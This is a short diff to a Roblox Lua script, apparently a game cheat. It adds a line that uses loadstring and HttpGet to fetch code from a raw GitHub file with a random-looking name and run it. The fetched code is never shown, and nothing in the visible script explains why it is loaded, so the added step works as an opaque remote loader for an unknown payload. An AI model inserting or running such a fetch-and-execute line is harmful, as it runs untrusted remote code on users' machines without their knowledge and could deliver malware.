@@ -4,6 +4,9 @@ for _, obj in pairs(game.Players.LocalPlayer.PlayerScripts:GetChildren()) do
     end
 end
 
+_G.ScriptName = "Setting Car"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
